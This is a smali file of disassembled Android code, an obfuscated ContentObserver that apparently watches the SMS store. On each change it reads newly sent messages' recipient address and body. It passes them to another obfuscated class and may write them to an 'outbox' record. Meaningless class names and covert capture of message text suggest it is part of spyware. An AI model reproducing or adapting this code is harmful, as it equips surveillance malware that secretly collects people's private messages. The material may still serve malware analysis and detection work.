.class Lcom/azianames/foroneyhar/usuayu88rw4;
.super Landroid/database/ContentObserver;


# instance fields
.field final synthetic ttmhx7:Lcom/azianames/foroneyhar/filnnomn;


# direct methods
.method public constructor <init>(Lcom/azianames/foroneyhar/filnnomn;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lcom/azianames/foroneyhar/usuayu88rw4;->ttmhx7:Lcom/azianames/foroneyhar/filnnomn;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method public onChange(Z)V
    .locals 8

    const/4 v2, 0x0

    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->ja66gqu:Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iget-object v0, p0, Lcom/azianames/foroneyhar/usuayu88rw4;->ttmhx7:Lcom/azianames/foroneyhar/filnnomn;

    invoke-virtual {v0}, Lcom/azianames/foroneyhar/filnnomn;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    iget-object v0, p0, Lcom/azianames/foroneyhar/usuayu88rw4;->ttmhx7:Lcom/azianames/foroneyhar/filnnomn;

    invoke-virtual {v0}, Lcom/azianames/foroneyhar/filnnomn;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    const-string v0, "protocol"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_1

    const-string v0, "_id"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v0

    invoke-static {}, Lcom/azianames/foroneyhar/filnnomn;->ttmhx7()J

    move-result-wide v4

    cmp-long v3, v0, v4

    if-eqz v3, :cond_1

    invoke-static {v0, v1}, Lcom/azianames/foroneyhar/filnnomn;->ttmhx7(J)J

    const-string v0, "thread_id"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->ub3me3t9yzv:Ljava/lang/String;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iget-object v0, p0, Lcom/azianames/foroneyhar/usuayu88rw4;->ttmhx7:Lcom/azianames/foroneyhar/filnnomn;

    invoke-virtual {v0}, Lcom/azianames/foroneyhar/filnnomn;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    const-string v1, "address"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "body"

    invoke-interface {v7, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v7, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/azianames/foroneyhar/cehyzt7dw;

    invoke-direct {v3}, Lcom/azianames/foroneyhar/cehyzt7dw;-><init>()V

    invoke-virtual {v3, v6}, Lcom/azianames/foroneyhar/cehyzt7dw;->usuayu88rw4(Landroid/content/Context;)Z

    invoke-virtual {v3, v1, v2}, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw(Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    const-string v4, "outbox"

    invoke-static {v6, v4, v1, v2, v3}, Lcom/azianames/foroneyhar/filnnomn;->ttmhx7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V

    :cond_0
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_1
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    return-void
.end method
